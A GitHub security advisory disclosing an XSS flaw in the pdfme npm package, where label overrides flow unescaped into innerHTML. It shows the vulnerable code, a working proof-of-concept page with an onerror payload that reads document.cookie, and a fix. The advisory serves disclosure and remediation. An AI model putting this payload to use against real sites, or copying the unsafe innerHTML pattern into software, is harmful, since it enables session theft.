# [M] PDFME  has XSS via Unsanitized i18n Label Injection into innerHTML in multiVariableText propPanel

## Summary
Severity: Medium
Advisory: GHSA-xgx4-2wgv-4jhm
CWE: CWE-79
Ecosystem: npm
CVSS: CVSS:3.1/AV:N/AC:H/PR:L/UI:R/S:C/C:L/I:L/A:N (CVSS_V3)
Published: 2026-03-20
Source: https://github.com/advisories/GHSA-xgx4-2wgv-4jhm
Type: github-advisory

## Affected
- npm: `@pdfme/schemas` — affected >=0 <5.5.10

## Details
## Summary

The multiVariableText property panel in `@pdfme/schemas` constructs HTML via string concatenation and assigns it to `innerHTML` using unsanitized i18n label values. An attacker who can control label overrides passed through `options.labels` can inject arbitrary JavaScript that executes in the context of any user who opens the Designer and selects a multiVariableText field with no `{variables}` in its text.

## Details

When a user selects a multiVariableText schema field that contains no `{variable}` placeholders, the property panel renders instructional text by concatenating i18n-translated strings directly into `innerHTML`.

**Vulnerable sink** — `packages/schemas/src/multiVariableText/propPanel.ts:65-71`:

```typescript
// Use safe string concatenation for innerHTML
const typingInstructions = i18n('schemas.mvt.typingInstructions');
const sampleField = i18n('schemas.mvt.sampleField');
para.innerHTML =
  typingInstructions +
  ` <code style="color:${safeColorValue}; font-weight:bold;">{` +
  sampleField +
  '}</code>';
```

The comment on line 64 claims "safe string concatenation" but the result is assigned to `innerHTML` with no HTML escaping applied to `typingInstructions` or `sampleField`.

**i18n lookup has no escaping** — `packages/ui/src/i18n.ts:903`:

```typescript
export const i18n = (key: keyof Dict, dict?: Dict) => (dict || getDict(DEFAULT_LANG))[key];
```

This is a plain dictionary lookup — no HTML encoding or sanitization.

**Label override via deep merge** — `packages/ui/src/components/AppContextProvider.tsx:57-63`:

```typescript
let dict = getDict(lang);
if (options.labels) {
  dict = deepMerge(
    dict as unknown as Record<string, unknown>,
    options.labels as unknown as Record<string, unknown>,
  ) as typeof dict;
}
```

User-supplied `options.labels` values are deep-merged into the i18n dictionary with no content sanitization. The Zod schema validates labels as `z.record(z.string(), z.string())` — enforcing type but not content safety.

**Inconsistency:** The color value on lines 58-62 is explicitly validated with a regex allowlist, demonstrating security awareness. The i18n string values were simply overlooked.

## PoC

1. **Create a minimal app that passes attacker-controlled labels:**

```html
<html>
<body>
<div id="designer-container" style="width:100%;height:700px;"></div>
<script type="module">
import { Designer } from '@pdfme/ui';
import { multiVariableText } from '@pdfme/schemas';

const template = {
  basePdf: { width: 210, height: 297, padding: [10, 10, 10, 10] },
  schemas: [[{
    type: 'multiVariableText',
    name: 'field1',
    text: 'plain text with no variables',
    content: '{}',
    variables: [],
    position: { x: 20, y: 20 },
    width: 100,
    height: 20,
    readOnly: true,
  }]],
};

new Designer({
  domContainer: document.getElementById('designer-container'),
  template,
  plugins: { multiVariableText },
  options: {
    labels: {
      'schemas.mvt.typingInstructions':
        '<img src=x onerror="document.title=document.cookie">Inject: ',
      'schemas.mvt.sampleField': 'safe',
    },
  },
});
</script>
</body>
</html>
```

2. **Open the application in a browser.**

3. **Click on the multiVariableText field** (`field1`) in the Designer canvas to select it.

4. **Observe:** The property panel renders the injected HTML. The `onerror` handler executes, setting `document.title` to the page's cookies. In a real attack, this would exfiltrate session tokens to an attacker-controlled server.

## Impact

- **Session hijacking:** Attacker-injected JavaScript can steal authentication cookies and tokens from any user who opens the Designer.
- **DOM manipulation:** The injected script runs in the application's origin, allowing phishing overlays, form hijacking, or data exfiltration.
- **Stored XSS potential:** In multi-tenant applications where labels are stored in a database or fetched from an API, a single poisoned label entry affects all users who subsequently open the Designer.
- **Scope change:** The XSS payload executes in the embedding application's browser context, escaping the pdfme component's security boundary.

## Recommended Fix

Replace `innerHTML` with safe DOM APIs in `packages/schemas/src/multiVariableText/propPanel.ts`:

```typescript
// BEFORE (vulnerable):
para.innerHTML =
  typingInstructions +
  ` <code style="color:${safeColorValue}; font-weight:bold;">{` +
  sampleField +
  '}</code>';

// AFTER (safe):
para.appendChild(document.createTextNode(typingInstructions + ' '));
const codeEl = document.createElement('code');
codeEl.style.color = safeColorValue;
codeEl.style.fontWeight = 'bold';
codeEl.textContent = `{${sampleField}}`;
para.appendChild(codeEl);
```

This ensures that i18n label values are always treated as text content, never parsed as HTML, regardless of their source.

## References
- https://github.com/pdfme/pdfme/security/advisories/GHSA-xgx4-2wgv-4jhm
- https://github.com/pdfme/pdfme
